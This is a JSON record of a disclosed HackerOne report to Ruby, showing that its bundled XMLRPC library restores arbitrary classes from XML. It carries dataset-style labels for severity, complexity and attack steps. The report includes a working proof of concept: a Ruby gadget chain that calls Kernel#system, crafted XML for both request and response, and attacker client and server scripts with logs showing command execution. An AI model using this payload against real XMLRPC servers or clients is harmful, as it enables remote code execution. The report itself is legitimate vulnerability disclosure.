{
  "reported_to": "Ruby",
  "reported_by": "ooooooo_q ",
  "title": "XMLRPC does not limit deserializable classes.",
  "content": "\nI confirmed that the classes that can be generated by parsing the xml sent in the request or response by XMLRPC bundled in ruby are not restricted.\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/create.rb#L251\nCode 215 Bytes\n1  if Config::ENABLE_MARSHALLING and param.class.included_modules.include? XMLRPC::Marshallable\n2    # convert Ruby object into Hash\n3    ret = {\"___class___\" => param.class.name}\n4    param.instance_variables.each {|v|\nWhen converting parameters to XML, limited to those that include XMLRPC::Marshallable.\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/parser.rb#L104\nCode 591 Bytes\n1# Converts the given +hash+ to a marshalled object.\n2#\n3# Returns the given +hash+ if an exception occurs.\n4def self.struct(hash)\n5  # convert to marshalled object\n6  klass = hash[\"___class___\"]\n7  if klass.nil? or Config::ENABLE_MARSHALLING == false\n8    hash\n9  else\n10    begin\n11      mod = Module\n12      klass.split(\"::\").each {|const| mod = mod.const_get(const.strip)}\n13\n14      obj = mod.allocate\n15\n16      hash.delete \"___class___\"\n17      hash.each {|key, value|\n18        obj.instance_variable_set(\"@#{ key }\", value) if key =~ /^([a-zA-Z_]\\w*)$/\n19      }\n20      obj\n21    rescue\n22      hash\n23    end\n24  end\n25end\nHowever, there are no class restrictions when parsing.\nhttps://github.com/ruby/xmlrpc/blob/v0.3.2/lib/xmlrpc/config.rb#L27\nCode 104 Bytes\n1    # enable marshalling Ruby objects which include XMLRPC::Marshallable\n2    ENABLE_MARSHALLING   = true\nConfig::ENABLE_MARSHALLING is true by default so there is no limit to the classes that can be restored.\n\nPoC\nPrepare\ncreate build_xml.rb\nCode 1.11 KiB\n1require \"xmlrpc/marshal\"\n2\n3# Universal Deserialisation Gadget for Ruby 2.x-3.x\n4# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html\n5\n6# Autoload the required classes\n7Gem::SpecFetcher\n8Gem::Installer\n9\n10# Because the classes that can be dumped are limited\n11class Array\n12  def include?(_)\n13    true\n14  end\n15end\n16\n17wa1 = Net::WriteAdapter.new(Kernel, :system)\n18\n19rs = Gem::RequestSet.allocate\n20rs.instance_variable_set('@sets', wa1)\n21rs.instance_variable_set('@git_set', \"date\")\n22\n23wa2 = Net::WriteAdapter.new(rs, :resolve)\n24\n25i = Gem::Package::TarReader::Entry.allocate\n26i.instance_variable_set('@read', 0)\n27i.instance_variable_set('@header', \"aaa\")\n28\n29\n30n = Net::BufferedIO.allocate\n31n.instance_variable_set('@io', i)\n32n.instance_variable_set('@debug_output', wa2)\n33\n34t = Gem::Package::TarReader.allocate\n35t.instance_variable_set('@io', n)\n36\n37r = Gem::Requirement.allocate\n38r.instance_variable_set('@requirements', t)\n39\n40creater = XMLRPC::Create.new\n41call_xml = creater.methodCall(\"for_call\", r)\n42File.write('attack_call.xml', call_xml)\n43\n44response_xml = creater.methodResponse(\"for_response\", r)\n45File.write('attack_response.xml', response_xml)\nCode 261 Bytes\n1$ cat Gemfile\n2# frozen_string_literal: true\n3\n4source \"https://rubygems.org\"\n5\n6gem 'xmlrpc', '~> 0.3.2'\n7gem 'webrick', '~> 1.7'\n8gem 'rack', '~> 2.2', '>= 2.2.3'\n9\n10$ bundle install\n11...\n12\n13$ bundle exec ruby build_xml.rb\n14# create attack_call.xml and attack_response.xml\nPoC for server attack\nCode 288 Bytes\n1# craft_client.rb\n2require \"xmlrpc/client\"\n3\n4server = XMLRPC::Client.new(\"localhost\", \"/RPC2\", 8080)\n5craft = File.read(\"./attack_call.xml\")\n6ok, param = server.send(:do_rpc, craft)\n7\n8\n9if ok then\n10  puts \"param: #{param}\"\n11else\n12  puts \"Error:\"\n13  puts param.faultCode\n14  puts param.faultString\n15end\nCode 333 Bytes\n1# xmlrpc_server.rb\n2\n3require \"webrick\"\n4require \"xmlrpc/server\"\n5\n6# required classes\n7require 'net/http'\n8Gem::Installer\n9\n10s = XMLRPC::WEBrickServlet.new\n11\n12s.add_handler(\"for_call\") do |param|\n13  param.to_s\n14end\n15\n16httpserver = WEBrick::HTTPServer.new(:Port => 8080)\n17httpserver.mount(\"/RPC2\", s)\n18trap(:INT){httpserver.shutdown}\n19httpserver.start\nCode 42 Bytes\n1\u276f bundle exec ruby craft_client.rb\n2param:\n3\nCode 359 Bytes\n1\u276f bundle exec ruby xmlrpc_server.rb\n2[2021-05-09 20:49:35] INFO  WEBrick 1.7.0\n3[2021-05-09 20:49:35] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]\n4[2021-05-09 20:49:35] INFO  WEBrick::HTTPServer#start: pid=48443 port=8080\n5sh: reading: command not found\n62021\u5e74 5\u6708 9\u65e5 \u65e5\u66dc\u65e5 20\u664249\u520644\u79d2 JST\n7::1 - - [09/May/2021:20:49:44 JST] \"POST /RPC2 HTTP/1.1\" 200 319\n8- -> /RPC2\nPoC for client attack\nCode 301 Bytes\n1# xmlrpc_client.rb\n2\n3require \"xmlrpc/client\"\n4\n5# required classes\n6Gem::Installer\n7\n8server = XMLRPC::Client.new(\"localhost\", \"/RPC\", 8080)\n9ok, param = server.call2(\"xxx\", 4, 5)\n10\n11if ok then\n12   puts \"param: #{param}\" # call param.to_s\n13else\n14  puts \"Error:\"\n15  puts param.faultCode\n16  puts param.faultString\n17end\nCode 236 Bytes\n1# craft_server.rb\n2\n3require \"webrick\"\n4\n5httpserver = WEBrick::HTTPServer.new(:Port => 8080)\n6\n7httpserver.mount_proc('/RPC') do |req, res|\n8  res.body = File.read(\"./attack_response.xml\")\n9end\n10\n11trap(:INT){httpserver.shutdown}\n12httpserver.start\nCode 137 Bytes\n1\u276f bundle exec ruby xmlrpc_client.rb\n2sh: reading: command not found\n32021\u5e74 5\u6708 9\u65e5 \u65e5\u66dc\u65e5 20\u664250\u520648\u79d2 JST\n4Traceback (most recent call last):\n5  ...\nCode 296 Bytes\n1\u276f bundle exec ruby craft_server.rb\n2[2021-05-09 20:50:34] INFO  WEBrick 1.7.0\n3[2021-05-09 20:50:34] INFO  ruby 2.7.1 (2020-03-31) [x86_64-darwin19]\n4[2021-05-09 20:50:34] INFO  WEBrick::HTTPServer#start: pid=48570 port=8080\n5::1 - - [09/May/2021:20:50:48 JST] \"POST /RPC HTTP/1.1\" 200 1679\n6- -> /RPC\nImpact\nUnintentional classes are created by crafted XML on both the server and client.\nWhether RCE is possible depends on the implementation of the application.\nIn order for the gadget chain for Marshal.load to work, need to find that the class is loaded and where methods such as to_s are called.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Deserialization of Untrusted Data"
  ],
  "screenshots": {},
  "disclosed_date": 1690941240,
  "report_url": "https://hackerone.com/reports/1189419",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Prepare the exploit by creating a malicious XML file using the provided 'build_xml.rb' script, which leverages Ruby's XMLRPC library to craft a payload that includes a universal deserialization gadget."
    ],
    [
      2,
      "Execute the attack by either sending the crafted XML to a vulnerable XMLRPC server (server attack) or by tricking a client into processing a malicious XML response (client attack), as demonstrated in the PoC scripts."
    ]
  ],
  "vuln_description": "The vulnerability is an insecure deserialization flaw in Ruby's XMLRPC library where the deserialization of classes is not restricted when parsing XML requests or responses. This allows an attacker to craft malicious XML that, when processed, can lead to unintended class instantiation and potentially remote code execution, depending on the application's implementation and the classes loaded.",
  "reason": "The attack involves understanding and manipulating Ruby's XMLRPC serialization and deserialization process, crafting a specific XML payload that exploits the lack of class restrictions during deserialization. The attacker must also be aware of or discover a suitable gadget chain for Ruby's Marshal.load to achieve RCE, which requires knowledge of Ruby's internals and the application's loaded classes.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}